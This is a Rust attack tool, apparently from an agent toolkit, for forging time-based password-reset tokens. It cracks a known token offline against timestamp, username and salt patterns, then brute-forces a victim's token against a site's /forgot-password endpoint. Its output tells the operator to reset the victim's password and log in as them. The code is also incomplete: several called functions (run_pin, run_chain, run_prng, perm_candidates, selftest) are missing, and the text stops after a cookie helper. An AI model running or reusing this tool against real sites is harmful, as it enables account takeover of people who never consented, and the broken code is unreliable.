#!/usr/bin/env rust-script
//! name: ts_token
//! description: Time-derived token workflow for reset-token forgeries - offline crack of a known token against timestamp input patterns (second mode: decimal/hex/ms/us epoch + ISO forms with salt prefix/suffix; microsecond mode: PHP microtime()/sprintf float/uniqid forms), then online enumeration of a victim's token over a microsecond window bounded by a bracketing pair of known tokens, against the reset endpoint.
//! version: 1.0.1
//! args: sec <target-hash> [--sec-lo N] [--sec-hi N] [--user U] [--email E] [--pw P] [--algo sha1|sha256|both] [--threads N] | us <target-hash> --sec|--sec-lo/--sec-hi [--us-lo N] [--us-hi N] [--pattern LIST] [--combo LIST] [--user U] [--email E] [--pw P] [--algo sha1|sha256] [--threads N] [--ids] | pin <base-url> [--me U] [--jar PATH] [--window N] [--pattern LIST] [--combo LIST] [--threads N] | chain <base-url> [--me U] [--count N] [--jar PATH] | prng <target-hash> [--seed-lo N] [--seed-hi N] [--outputs N] [--user U] [--algo sha1|sha256] | probe <base-url> --user U [--token HEX]... [--strategy all|LIST] [--pattern all|LIST] [--combo all|LIST] [--sec-lo N] [--sec-hi N] [--sec-window N] [--us-lo N] [--us-hi N] [--email E] [--pw P] [--algo S] [--threads N] [--jar PATH] [--max-req N] [--selftest]
//! keywords: 时间敏感, reset token, 口令重置, microtime, uniqid, sha1, 时间戳哈希, 竞态条件族, token 伪造
//!
//! ```cargo
//! [dependencies]
//! sha1 = "0.10"
//! sha2 = "0.10"
//! chrono = "0.4"
//! ureq = { version = "2" }
//! ```
use pi_rust_lib::serde_json::{json, Value};
use sha1::Sha1;
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

// 秒粒度模式:输入只含秒级时间,文字形态尽量铺开。
const SEC_PATTERNS: &[&str] = &[
    "sec_only",
    "sec_hex",
    "sec_ms",
    "sec_us",
    "sec_int_ms",
    "sec_int_us",
    "iso",
    "iso_t",
    "iso_ms",
    "http_date",
    "dmy",
    "ymdhms",
];
// 微秒粒度模式:输入随微秒变化,PHP 系写法优先。
const US_PATTERNS: &[&str] = &[
    "php_microtime",
    "sec_us6",
    "sec_dot_us6",
    "float4r",
    "float4f",
    "float5r",
    "float6",
    "msr",
    "msf",
    "ms_concat",
    "usec_int",
    "msec_int",
    "uniqid",
    "microtime_true_str",
    "sci_ms",
    "sci_ms_lc",
    "sci_us",
    "sci_us_lc",
];
const COMBOS: &[&str] = &[
    "t",
    "user_t",
    "t_user",
    "email_t",
    "t_email",
    "pw_t",
    "t_pw",
    "user_space_t",
    "t_space_user",
    "user_colon_t",
    "user_us_t",
    "user_dash_t",
    "t_user_email",
    "user_t_pw",
    "t_user_email_pw",
];
const SALTS: &[&str] = &[
    "", "secret", "salt", "reset", "password", "token", "wasp", "thankyou", "key", "mysecret",
    "changeme",
];
// 数值身份维:部分实现把 user_id 而不是用户名拌进哈希。
const IDS: &[&str] = &[
    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10",
];
// 微秒扫描只留低号 id:该模式按微秒迭代,每个候选都要一次分配,id 全表会把时钟花在 malloc 上。
const US_IDS: &[&str] = &["1", "2"];

/// 运行截止:PI_TIMEOUT_SECS 提前 15s 收手,已扫过的部分仍入信封(deadline_cut 标记)。
fn deadline() -> Option<std::time::Instant> {
    let secs: u64 = std::env::var("PI_TIMEOUT_SECS")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(600);
    if secs < 30 {
        return None;
    }
    Some(std::time::Instant::now() + Duration::from_secs(secs - 15))
}

fn time_string(p: &str, sec: i64, us: u32) -> String {
    match p {
        "sec_only" => format!("{}", sec),
        "sec_hex" => format!("{:x}", sec),
        "sec_ms" => format!("{}000", sec),
        "sec_us" => format!("{}000000", sec),
        "sec_int_ms" => format!("{}", sec * 1000),
        "sec_int_us" => format!("{}", sec * 1_000_000),
        "iso" => chrono::DateTime::from_timestamp(sec, 0)
            .map(|d| d.format("%Y-%m-%d %H:%M:%S").to_string())
            .unwrap_or_default(),
        "iso_t" => chrono::DateTime::from_timestamp(sec, 0)
            .map(|d| d.format("%Y-%m-%dT%H:%M:%S").to_string())
            .unwrap_or_default(),
        "ymdhms" => chrono::DateTime::from_timestamp(sec, 0)
            .map(|d| d.format("%Y%m%d%H%M%S").to_string())
            .unwrap_or_default(),
        "iso_ms" => chrono::DateTime::from_timestamp(sec, 0)
            .map(|d| d.format("%Y-%m-%dT%H:%M:%S.000Z").to_string())
            .unwrap_or_default(),
        "http_date" => chrono::DateTime::from_timestamp(sec, 0)
            .map(|d| d.format("%a, %d %b %Y %H:%M:%S GMT").to_string())
            .unwrap_or_default(),
        "dmy" => chrono::DateTime::from_timestamp(sec, 0)
            .map(|d| d.format("%d/%m/%Y %H:%M:%S").to_string())
            .unwrap_or_default(),
        "php_microtime" => format!("0.{:08} {}", us as u64 * 100, sec),
        "sec_us6" => format!("{}{:06}", sec, us),
        "sec_dot_us6" => format!("{}.{:06}", sec, us),
        "float4r" => format!("{}.{:04}", sec, (us + 50) / 100),
        "float1" => format!("{}.{}", sec, us / 100_000),
        "float2" => format!("{}.{:02}", sec, us / 10_000),
        "float7" => format!("{}.{:07}", sec, us * 10),
        "float8" => format!("{}.{:08}", sec, us * 100),
        "float4f" => format!("{}.{:04}", sec, us / 100),
        "float5r" => format!("{}.{:05}", sec, (us + 5) / 10),
        "float6" => format!("{}.{:06}", sec, us),
        "msr" => format!("{}.{:03}", sec, (us + 500) / 1000),
        "msf" => format!("{}.{:03}", sec, us / 1000),
        "ms_concat" => format!("{}{:03}", sec, us / 1000),
        "usec_int" => format!("{}", sec * 1_000_000 + us as i64),
        "msec_int" => format!("{}", sec * 1000 + (us / 1000) as i64),
        "uniqid" => format!("{:08x}{:05x}", sec as u32, us),
        "microtime_true_str" => format!("{}.{}", sec, us),
        "sci_ms" => format!("{:E}", sec as f64 * 1000.0 + us as f64 / 1000.0).replace('E', "E+"),
        "sci_ms_lc" => format!("{:e}", sec as f64 * 1000.0 + us as f64 / 1000.0).replace('e', "e+"),
        "sci_us" => format!("{:E}", sec as f64 * 1_000_000.0 + us as f64).replace('E', "E+"),
        "sci_us_lc" => format!("{:e}", sec as f64 * 1_000_000.0 + us as f64).replace('e', "e+"),
        other => format!("<unknown-pattern:{}>", other),
    }
}

fn combo(c: &str, t: &str, user: &str, email: &str, pw: &str) -> String {
    match c {
        "t" => t.to_string(),
        "user_t" => format!("{}{}", user, t),
        "t_user" => format!("{}{}", t, user),
        "email_t" => format!("{}{}", email, t),
        "t_email" => format!("{}{}", t, email),
        "pw_t" => format!("{}{}", pw, t),
        "t_pw" => format!("{}{}", t, pw),
        "user_space_t" => format!("{} {}", user, t),
        "t_space_user" => format!("{} {}", t, user),
        "user_colon_t" => format!("{}:{}", user, t),
        "user_us_t" => format!("{}_{}", user, t),
        "user_dash_t" => format!("{}-{}", user, t),
        "t_user_email" => format!("{}{}{}", t, user, email),
        "user_t_pw" => format!("{}{}{}", user, t, pw),
        "t_user_email_pw" => format!("{}{}{}{}", t, user, email, pw),
        other => format!("<unknown-combo:{}>", other),
    }
}

fn hash_bytes(algo: &str, bytes: &[u8]) -> String {
    if algo == "sha256" {
        let mut h = Sha256::new();
        h.update(bytes);
        format!("{:x}", h.finalize())
    } else {
        let mut h = Sha1::new();
        h.update(bytes);
        format!("{:x}", h.finalize())
    }
}

fn hash_str(algo: &str, s: &str) -> String {
    if algo == "sha256" {
        let mut h = Sha256::new();
        h.update(s.as_bytes());
        format!("{:x}", h.finalize())
    } else {
        let mut h = Sha1::new();
        h.update(s.as_bytes());
        format!("{:x}", h.finalize())
    }
}

#[derive(Clone)]
struct Cfg {
    target: String,
    sec_lo: i64,
    sec_hi: i64,
    us_lo: u32,
    us_hi: u32,
    sec: i64,
    user: String,
    email: String,
    pw: String,
    algo: String,
    threads: usize,
    pattern: String,
    combo: String,
    salt: String,
    jar: Option<String>,
    max_req: usize,
}

fn parse(args: &[String]) -> (BTreeMap<String, String>, Vec<String>) {
    let valued = [
        "--sec-lo",
        "--sec-hi",
        "--us-lo",
        "--us-hi",
        "--sec",
        "--user",
        "--email",
        "--pw",
        "--algo",
        "--threads",
        "--pattern",
        "--combo",
        "--salt",
        "--jar",
        "--max-req",
        "--target",
        "--token",
        "--strategy",
        "--sec-window",
        "--count",
        "--outputs",
        "--seed-lo",
        "--seed-hi",
        "--window",
        "--me",
    ];
    let mut kv = BTreeMap::new();
    let mut tokens: Vec<String> = Vec::new();
    let mut pos = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let a = &args[i];
        if valued.contains(&a.as_str()) && i + 1 < args.len() {
            if a == "--token" {
                tokens.push(args[i + 1].clone());
            } else {
                kv.insert(a.clone(), args[i + 1].clone());
            }
            i += 2;
        } else if a.starts_with("--") {
            i += 1;
        } else {
            pos.push(a.clone());
            i += 1;
        }
    }
    if !tokens.is_empty() {
        kv.insert("--token".to_string(), tokens.join(","));
    }
    (kv, pos)
}

fn threads_for(kv: &BTreeMap<String, String>) -> usize {
    kv.get("--threads")
        .and_then(|v| v.parse::<usize>().ok())
        .unwrap_or_else(|| {
            std::thread::available_parallelism()
                .map(|n| n.get().min(16))
                .unwrap_or(8)
        })
        .max(1)
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    if args.is_empty() {
        pi_rust_lib::report::failure(
            "ts_token",
            "need a subcommand",
            "usage: ts_token sec|us|probe ... (see //! args)",
        );
        return;
    }
    let (kv, pos) = parse(&args[1..]);
    match args[0].as_str() {
        "sec" => run_sec(&kv, &pos),
        "us" => run_us(&kv, &pos),
        "pin" => run_pin(&kv, &pos),
        "chain" => run_chain(&kv, &pos),
        "prng" => run_prng(&kv, &pos),
        "probe" => run_probe(&kv, &pos),
        other => {
            pi_rust_lib::report::failure(
                "ts_token",
                &format!("unknown subcommand: {}", other),
                "usage: ts_token sec|us|probe ...",
            );
            return;
        }
    }
}

fn cfg_from(kv: &BTreeMap<String, String>, target: String) -> Cfg {
    Cfg {
        target: target.to_lowercase(),
        sec_lo: kv.get("--sec-lo").and_then(|v| v.parse().ok()).unwrap_or(0),
        sec_hi: kv.get("--sec-hi").and_then(|v| v.parse().ok()).unwrap_or(0),
        us_lo: kv.get("--us-lo").and_then(|v| v.parse().ok()).unwrap_or(0),
        us_hi: kv
            .get("--us-hi")
            .and_then(|v| v.parse().ok())
            .unwrap_or(999_999),
        sec: kv.get("--sec").and_then(|v| v.parse().ok()).unwrap_or(0),
        user: kv.get("--user").cloned().unwrap_or_default(),
        email: kv.get("--email").cloned().unwrap_or_default(),
        pw: kv.get("--pw").cloned().unwrap_or_default(),
        algo: kv
            .get("--algo")
            .cloned()
            .unwrap_or_else(|| "sha1".to_string())
            .to_lowercase(),
        threads: threads_for(kv),
        pattern: kv.get("--pattern").cloned().unwrap_or_default(),
        combo: kv.get("--combo").cloned().unwrap_or_default(),
        salt: kv.get("--salt").cloned().unwrap_or_default(),
        jar: kv.get("--jar").cloned(),
        max_req: kv
            .get("--max-req")
            .and_then(|v| v.parse().ok())
            .unwrap_or(usize::MAX),
    }
}

// ---- sec mode: 秒粒度全形态 + 盐前后缀 ----
fn run_sec(kv: &BTreeMap<String, String>, pos: &[String]) {
    let target = pos.first().cloned().unwrap_or_default();
    if target.is_empty() {
        pi_rust_lib::report::failure("ts_token", "sec mode needs a target hash", "usage: ts_token sec <hash> --sec-lo N --sec-hi N --user U");
        return;
    }
    let cfg = cfg_from(kv, target);
    let lo = cfg.sec_lo;
    let hi = cfg.sec_hi;
    if hi < lo {
        pi_rust_lib::report::failure("ts_token", "need --sec-lo <= --sec-hi", "usage: ts_token sec <hash> --sec-lo N --sec-hi N");
        return;
    }
    let start = Instant::now();
    // --algo both 时两种哈希都试(截断 sha256 也是 40 位十六进制)。
    let algos: Arc<Vec<String>> = Arc::new(if cfg.algo == "both" {
        vec!["sha1".to_string(), "sha256".to_string()]
    } else {
        vec![cfg.algo.clone()]
    });
    let with_perms = kv.contains_key("--perms");
    let hits: Arc<Mutex<Vec<Value>>> = Arc::new(Mutex::new(Vec::new()));
    let tested = Arc::new(AtomicUsize::new(0));
    let cfg = Arc::new(cfg);
    let span = (hi - lo + 1) as usize;
    let chunk = span.div_ceil(cfg.threads).max(1);
    let mut handles = Vec::new();
    for t in 0..cfg.threads {
        let from = lo + (t * chunk) as i64;
        let to = (from + chunk as i64 - 1).min(hi);
        if from > hi {
            break;
        }
        let cfg = cfg.clone();
        let hits = hits.clone();
        let tested = tested.clone();
        let algos = algos.clone();
        let algos2 = algos.clone();
        handles.push(std::thread::spawn(move || {
            let _ = &algos2;
            let mut local = Vec::new();
            let mut n = 0usize;
            for sec in from..=to {
                for p in SEC_PATTERNS {
                    let tstr = time_string(p, sec, 0);
                    for c in COMBOS {
                        let body = combo(c, &tstr, &cfg.user, &cfg.email, &cfg.pw);
                        for salt in SALTS {
                            let cands = if salt.is_empty() {
                                vec![body.clone()]
                            } else {
                                vec![format!("{}{}", salt, body), format!("{}{}", body, salt)]
                            };
                            for cand in cands {
                                n += 1;
                                for algo in algos.iter() {
                                    if hash_str(algo, &cand) == cfg.target {
                                        local.push(json!({
                                            "input": cand, "pattern": p, "combo": c,
                                            "salt": salt, "sec": sec, "us": 0, "algo": algo
                                        }));
                                    }
                                }
                            }
                        }
                    }
                    if with_perms {
                        for cand in perm_candidates(&tstr, &cfg.user, &cfg.email, &cfg.pw) {
                            n += 1;
                            for algo in algos.iter() {
                                if hash_str(algo, &cand) == cfg.target {
                                    local.push(json!({
                                        "input": cand, "pattern": p, "combo": "perm",
                                        "salt": "", "sec": sec, "us": 0, "algo": algo
                                    }));
                                }
                            }
                        }
                    }
                    for id in IDS {
                        for cand in [format!("{}{}", id, tstr), format!("{}{}", tstr, id)] {
                            n += 1;
                            for algo in algos.iter() {
                                if hash_str(algo, &cand) == cfg.target {
                                    local.push(json!({
                                        "input": cand, "pattern": p, "combo": "id_t/id",
                                        "salt": id, "sec": sec, "us": 0, "algo": algo
                                    }));
                                }
                            }
                        }
                    }
                }
            }
            tested.fetch_add(n, Ordering::Relaxed);
            hits.lock().unwrap().extend(local);
        }));
    }
    for h in handles {
        let _ = h.join();
    }
    let hits = hits.lock().unwrap().clone();
    let data = json!({
        "mode": "sec", "target": cfg.target, "algo": cfg.algo,
        "sec_lo": lo, "sec_hi": hi, "tested": tested.load(Ordering::Relaxed),
        "hits": hits, "elapsed_ms": start.elapsed().as_millis() as u64,
        "salts": SALTS.len(), "patterns": SEC_PATTERNS.len(), "combos": COMBOS.len(),
    });
    let next = if hits.is_empty() {
        "no second-granularity hit: the input carries sub-second entropy or an unknown secret - run us mode over the token's exact second"
    } else {
        "second-granularity scheme recovered: reuse pattern/combo/salt in probe mode against the victim"
    };
    pi_rust_lib::report::success("ts_token", data, next).expect("report");
}

// ---- us mode: 微秒粒度 ----
fn run_us(kv: &BTreeMap<String, String>, pos: &[String]) {
    let target = pos.first().cloned().unwrap_or_default();
    if target.is_empty() || (kv.get("--sec").is_none() && kv.get("--sec-lo").is_none()) {
        pi_rust_lib::report::failure(
            "ts_token",
            "us mode needs a target hash and --sec (or --sec-lo/--sec-hi)",
            "usage: ts_token us <hash> --sec N [--us-lo N --us-hi N] --user U",
        );
        return;
    }
    let cfg = cfg_from(kv, target);
    if cfg.us_hi < cfg.us_lo {
        pi_rust_lib::report::failure("ts_token", "need --us-lo <= --us-hi", "usage: ts_token us <hash> --sec N --us-lo N --us-hi N");
        return;
    }
    // --sec-lo/--sec-hi widen the scan across neighbouring seconds (the mail Sent
    // stamp can lag token generation, so the exact second is not guaranteed).
    let sec_lo = kv
        .get("--sec-lo")
        .and_then(|v| v.parse::<i64>().ok())
        .unwrap_or(cfg.sec);
    let sec_hi = kv
        .get("--sec-hi")
        .and_then(|v| v.parse::<i64>().ok())
        .unwrap_or(sec_lo)
        .max(sec_lo);
    let start = Instant::now();
    let dl = deadline();
    let patterns = split_all(kv.get("--pattern").map(|s| s.as_str()).unwrap_or(""), US_PATTERNS);
    let combos = split_all(kv.get("--combo").map(|s| s.as_str()).unwrap_or("all"), COMBOS);
    let with_ids = kv.contains_key("--ids");
    let hits: Arc<Mutex<Vec<Value>>> = Arc::new(Mutex::new(Vec::new()));
    let tested = Arc::new(AtomicUsize::new(0));
    let cut = Arc::new(AtomicBool::new(false));
    let cfg = Arc::new(cfg);
    let span = (cfg.us_hi - cfg.us_lo + 1) as usize;
    let nsec = (sec_hi - sec_lo + 1) as usize;
    let total = span * nsec;
    let chunk = total.div_ceil(cfg.threads).max(1);
    let mut handles = Vec::new();
    for t in 0..cfg.threads {
        let from = t * chunk;
        if from >= total {
            break;
        }
        let to = ((t + 1) * chunk - 1).min(total - 1);
        let cfg = cfg.clone();
        let hits = hits.clone();
        let tested = tested.clone();
        let cut = cut.clone();
        let patterns = patterns.clone();
        let combos = combos.clone();
        handles.push(std::thread::spawn(move || {
            let mut local = Vec::new();
            let mut n = 0usize;
            for i in from..=to {
                if i % 4096 == 0 {
                    if let Some(dl) = dl {
                        if Instant::now() >= dl {
                            cut.store(true, Ordering::Relaxed);
                            break;
                        }
                    }
                }
                let sec = sec_lo + (i / span) as i64;
                let us = cfg.us_lo + (i % span) as u32;
                for p in &patterns {
                    let tstr = time_string(p, sec, us);
                    for c in &combos {
                        let body = combo(c, &tstr, &cfg.user, &cfg.email, &cfg.pw);
                        let cand = if cfg.salt.is_empty() {
                            body
                        } else {
                            format!("{}{}", cfg.salt, body)
                        };
                        n += 1;
                        if hash_str(&cfg.algo, &cand) == cfg.target {
                            local.push(json!({
                                "input": cand, "pattern": p, "combo": c,
                                "salt": cfg.salt, "sec": sec, "us": us
                            }));
                        }
                    }
                    if with_ids {
                        for id in US_IDS {
                            for cand in [format!("{}{}", id, tstr), format!("{}{}", tstr, id)] {
                                n += 1;
                                if hash_str(&cfg.algo, &cand) == cfg.target {
                                    local.push(json!({
                                        "input": cand, "pattern": p, "combo": "id_t/id",
                                        "salt": id, "sec": sec, "us": us
                                    }));
                                }
                            }
                        }
                    }
                }
            }
            tested.fetch_add(n, Ordering::Relaxed);
            hits.lock().unwrap().extend(local);
        }));
    }
    for h in handles {
        let _ = h.join();
    }
    let hits = hits.lock().unwrap().clone();
    let data = json!({
        "mode": "us", "target": cfg.target, "algo": cfg.algo,
        "sec_lo": sec_lo, "sec_hi": sec_hi, "salt": cfg.salt,
        "us_lo": cfg.us_lo, "us_hi": cfg.us_hi, "tested": tested.load(Ordering::Relaxed),
        "hits": hits, "elapsed_ms": start.elapsed().as_millis() as u64,
        "patterns": patterns, "combos": combos, "with_ids": with_ids,
        "deadline_cut": cut.load(Ordering::Relaxed),
    });
    let next = if hits.is_empty() {
        "no microsecond hit: widen --us-* / neighbouring --sec, or the scheme carries a static secret (then token prediction is off the table)"
    } else {
        "microsecond scheme recovered: the bracketing tokens give the victim's us window for probe mode"
    };
    pi_rust_lib::report::success("ts_token", data, next).expect("report");
}

// ---- probe mode: 在线枚举受害者令牌 ----
fn load_cookie(jar: &str, host: &str) -> Option<String> {
    let raw = std::fs::read_to_string(jar).ok()?;
    let v: Value = pi_rust_lib::serde_json::from_str(&raw).ok()?;
    let obj = v.get(host)?.as_object()?;
    let pairs: Vec<String> = obj
        .iter()
        .map(|(k, val)| format!("{}={}", k, val.as_str().unwrap_or("")))
        .collect();
    if pairs.is_empty() {
        None
    } else {
        Some(pairs.join("; "))
    }
}

/// HMAC-SHA1(key, msg) - 令牌也可能走 hash_hmac 而不是裸拼接。
fn hmac_sha1(key: &[u8], msg: &[u8]) -> String {
    let mut k = if key.len() > 64 {
        Sha1::digest(key).to_vec()
    } else {
        key.to_vec()
    };
    k.resize(64, 0);
    let mut ipad = vec![0x36u8; 64];
    let mut opad = vec![0x5cu8; 64];
    for i in 0..64 {
        ipad[i] ^= k[i];
        opad[i] ^= k[i];
    }
    let mut inner = Sha1::new();
    inner.update(&ipad);
    inner.update(msg);
    let ih = inner.finalize();
    let mut outer = Sha1::new();
    outer.update(&opad);
    outer.update(&ih);
    format!("{:x}", outer.finalize())
}

const STRATEGIES: &[&str] = &[
    "plain",
    "double",
    "hmac_ku",
    "hmac_kt",
    "hmac_ke",
    "hmac_kt_e",
    "hmac_secret",
];

fn split_all(v: &str, all: &[&str]) -> Vec<String> {
    if v.is_empty() || v == "all" {
        all.iter().map(|s| s.to_string()).collect()
    } else {
        v.split(',')
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect()
    }
}

/// 一个时钟点上整张候选表:策略 x 时间形态 x 身份拼接。
fn probe_tokens(
    strategies: &[String],
    patterns: &[String],
    combos: &[String],
    sec: i64,
    us: u32,
    user: &str,
    email: &str,
    pw: &str,
    algo: &str,
) -> Vec<(String, String, String)> {
    let mut out = Vec::new();
    for st in strategies {
        for p in patterns {
            let t = time_string(p, sec, us);
            for c in combos {
                let x = combo(c, &t, user, email, pw);
                let token = match st.as_str() {
                    "plain" => hash_str(algo, &x),
                    "double" => hash_str(algo, &hash_str(algo, &x)),
                    "hmac_ku" => hmac_sha1(user.as_bytes(), x.as_bytes()),
                    "hmac_kt" => hmac_sha1(t.as_bytes(), user.as_bytes()),
                    "hmac_ke" => hmac_sha1(email.as_bytes(), x.as_bytes()),
                    "hmac_kt_e" => hmac_sha1(t.as_bytes(), email.as_bytes()),
                    "hmac_secret" => hmac_sha1(b"secret", x.as_bytes()),
                    _ => continue,
                };
                out.push((token, format!("{}|{}|{}", st, p, c), x));
            }
        }
    }
    out
}

fn run_probe(kv: &BTreeMap<String, String>, pos: &[String]) {
    let base = pos
        .first()
        .cloned()
        .or_else(|| kv.get("--target").cloned())
        .unwrap_or_default();
    let cfg = cfg_from(kv, String::new());
    let explicit: Vec<String> = split_all(kv.get("--token").map(|s| s.as_str()).unwrap_or(""), &[]);
    let sec_lo = kv
        .get("--sec-lo")
        .and_then(|v| v.parse::<i64>().ok())
        .unwrap_or(cfg.sec);
    let sec_hi = kv
        .get("--sec-hi")
        .and_then(|v| v.parse::<i64>().ok())
        .unwrap_or(sec_lo)
        .max(sec_lo);
    let now = chrono::Utc::now().timestamp();
    let sec_lo = kv
        .get("--sec-lo")
        .and_then(|v| v.parse::<i64>().ok())
        .unwrap_or_else(|| if cfg.sec != 0 { cfg.sec } else { now });
    let sec_hi = kv
        .get("--sec-hi")
        .and_then(|v| v.parse::<i64>().ok())
        .unwrap_or(sec_lo)
        .max(sec_lo);
    // --sec-window N 以本机当前秒为中心铺 N 秒两侧(服务端时钟与此同步时省去手填)。
    let (sec_lo, sec_hi) = match kv.get("--sec-window").and_then(|v| v.parse::<i64>().ok()) {
        Some(w) => (now - w, now + w),
        None => (sec_lo, sec_hi),
    };
    let strategies = split_all(kv.get("--strategy").map(|s| s.as_str()).unwrap_or("all"), STRATEGIES);
    let patterns = split_all(kv.get("--pattern").map(|s| s.as_str()).unwrap_or(""), US_PATTERNS);
    let combos = split_all(kv.get("--combo").map(|s| s.as_str()).unwrap_or("all"), COMBOS);
    if base.is_empty() {
        pi_rust_lib::report::failure(
            "ts_token",
            "probe needs <base-url> and --user U",
            "usage: ts_token probe https://lab/ --user victim --pattern all --combo all --strategy all --sec-lo N --sec-hi N --us-lo 0 --us-hi 0",
        );
        return;
    }
    let base = base.trim_end_matches('/').to_string();
    let host = base
        .split("//")
        .nth(1)
        .and_then(|s| s.split('/').next())
        .unwrap_or("")
        .to_string();
    let cookie = cfg.jar.as_deref().and_then(|j| load_cookie(j, &host));
    let start = Instant::now();
    let dl = deadline();
    let cut = Arc::new(AtomicBool::new(false));
    let found: Arc<Mutex<Option<Value>>> = Arc::new(Mutex::new(None));
    let stop = Arc::new(AtomicBool::new(false));
    let tested = Arc::new(AtomicUsize::new(0));
    let errors = Arc::new(AtomicUsize::new(0));
    let codes: Arc<Mutex<BTreeMap<String, usize>>> = Arc::new(Mutex::new(BTreeMap::new()));
    let base = Arc::new(base);
    let cookie = Arc::new(cookie);
    let user = cfg.user.clone();
    let email = cfg.email.clone();
    let pw = cfg.pw.clone();
    let algo = cfg.algo.clone();
    let max_req = cfg.max_req;
    let us_lo = kv.get("--us-lo").and_then(|v| v.parse::<u32>().ok()).unwrap_or(0);
    // 默认为秒粒度:微秒面必须显式给 --us-*,否则点数爆掉。
    let us_hi = kv.get("--us-hi").and_then(|v| v.parse::<u32>().ok()).unwrap_or(us_lo);
    let uspan = (us_hi - us_lo + 1) as usize;
    // 显式令牌先验(已知有效令牌可当机件自检),再铺开整个时钟面。
    let mut jobs: Vec<(i64, u32)> = Vec::new();
    if !explicit.is_empty() {
        jobs.push((i64::MIN, 0));
    }
    for sec in sec_lo..=sec_hi {
        for us in us_lo..=us_hi {
            jobs.push((sec, us));
        }
    }
    let total = jobs.len();
    let jobs = Arc::new(jobs);
    let strategies = Arc::new(strategies);
    let patterns = Arc::new(patterns);
    let combos = Arc::new(combos);
    let explicit = Arc::new(explicit);
    let next_idx = Arc::new(AtomicUsize::new(0));
    let mut handles = Vec::new();
    for _ in 0..cfg.threads {
        let base = base.clone();
        let cookie = cookie.clone();
        let found = found.clone();
        let stop = stop.clone();
        let tested = tested.clone();
        let errors = errors.clone();
        let codes = codes.clone();
        let jobs = jobs.clone();
        let strategies = strategies.clone();
        let patterns = patterns.clone();
        let combos = combos.clone();
        let explicit = explicit.clone();
        let next_idx = next_idx.clone();
        let cut = cut.clone();
        let user = user.clone();
        let email = email.clone();
        let pw = pw.clone();
        let algo = algo.clone();
        handles.push(std::thread::spawn(move || {
            let agent = ureq::AgentBuilder::new()
                .timeout(Duration::from_secs(10))
                .build();
            loop {
                if stop.load(Ordering::Relaxed) {
                    break;
                }
                if tested.load(Ordering::Relaxed) >= max_req {
                    break;
                }
                if let Some(dl) = dl {
                    if Instant::now() >= dl {
                        cut.store(true, Ordering::Relaxed);
                        break;
                    }
                }
                let j = next_idx.fetch_add(1, Ordering::SeqCst);
                if j >= total {
                    break;
                }
                let (sec, us) = jobs[j];
                let cands: Vec<(String, String, String)> = if sec == i64::MIN {
                    explicit
                        .iter()
                        .map(|t| (t.clone(), "explicit".to_string(), String::new()))
                        .collect()
                } else {
                    probe_tokens(&strategies, &patterns, &combos, sec, us, &user, &email, &pw, &algo)
                };
                for (token, tag, input) in cands {
                    if stop.load(Ordering::Relaxed) {
                        break;
                    }
                    let url = format!("{}/forgot-password?user={}&token={}", base, user, token);
                    let mut req = agent.get(&url);
                    if let Some(c) = cookie.as_ref() {
                        req = req.set("Cookie", c);
                    }
                    tested.fetch_add(1, Ordering::Relaxed);
                    match req.call() {
                        Ok(resp) => {
                            let code = resp.status();
                            *codes.lock().unwrap().entry(code.to_string()).or_insert(0) += 1;
                            if code == 200 {
                                let mut f = found.lock().unwrap();
                                if f.is_none() {
                                    *f = Some(json!({
                                        "token": token, "tag": tag, "input": input,
                                        "sec": sec, "us": us, "url": url
                                    }));
                                }
                                stop.store(true, Ordering::Relaxed);
                                break;
                            }
                        }
                        Err(ureq::Error::Status(code, _)) => {
                            *codes.lock().unwrap().entry(code.to_string()).or_insert(0) += 1;
                        }
                        Err(_) => {
                            errors.fetch_add(1, Ordering::Relaxed);
                        }
                    }
                }
            }
        }));
    }
    for h in handles {
        let _ = h.join();
    }
    let found = found.lock().unwrap().clone();
    let codes = codes.lock().unwrap().clone();
    let per_point = if patterns.is_empty() 
        || combos.is_empty() {
        0
    } else {
        strategies.len() * patterns.len() * combos.len()
    };
    let data = json!({
        "mode": "probe", "base": *base, "user": user, "algo": algo,
        "strategies": *strategies, "patterns": *patterns, "combos": *combos,
        "sec_lo": sec_lo, "sec_hi": sec_hi, "us_lo": us_lo, "us_hi": us_hi,
        "clock_points": total, "candidates_per_point": per_point,
        "explicit_tokens": explicit.len(),
        "tested": tested.load(Ordering::Relaxed), "max_req": max_req,
        "transport_errors": errors.load(Ordering::Relaxed),
        "status_counts": codes, "found": found,
        "elapsed_ms": start.elapsed().as_millis() as u64,
        "deadline_cut": cut.load(Ordering::Relaxed),
        "uspan": uspan,
    });
    let next = if found.is_some() {
        "token accepted: post csrf+user+token+new-password-1/2 to /forgot-password, then log in as the victim"
    } else {
        "no acceptance in this clock window: widen --sec-* / --us-*, or the token carries a secret this oracle cannot forge"
    };
    pi_rust_lib::report::success("ts_token", data, next).expect("report");
}

// ---- pin mode: 单次重置取真令牌,用响应 Date 与本机时钟把生成秒砸死,再扫微秒 ----
fn extract_csrf(html: &str) -> Option<String> {
    for marker in ["name=\"csrf\"", "name='csrf'"] {
        if let Some(pos) = html.find(marker) {
            let tail = &html[pos..];
            if let Some(vpos) = tail.find("value=") {
                let rest = &tail[vpos + 6..];
                let quote = rest.chars().next()?;
                if quote == '"' || quote == '\'' {
                    let end = rest[1..].find(quote)?;
                    return Some(rest[1..1 + end].to_string());
                }
            }
        }
    }
    None
}

fn extract_exploit_link(html: &str) -> Option<String> {
    let needle = "exploit-server.net/email";
    let idx = html.find(needle)?;
    let start = html[..idx].rfind('\'')? + 1;
    Some(html[start..idx + needle.len()].to_string())
}

type CookieStr = Arc<Mutex<String>>;

fn absorb_set_cookie(cookie: &CookieStr, resp: &ureq::Response) {
    let mut c = cookie.lock().unwrap();
    for val in resp.all("set-cookie") {
        if let Some((pair, _)) = val.split_once(';') {
            if let Some((name, value)) = pair.split_once('=') {
                let name = name.trim();
                let mut parts: Vec<String> = c
                    .split("; ")
                    .filter(|s| !s.is_empty())
                    .map(|s| s.to_string())
                    .collect();
                parts.retain(|p| !p.starts_with(&format!("{}=", name)));
                parts.push(format!("{}={}", name, value.trim()));
                *c = parts.join("; ");
            }
        }
    }
}

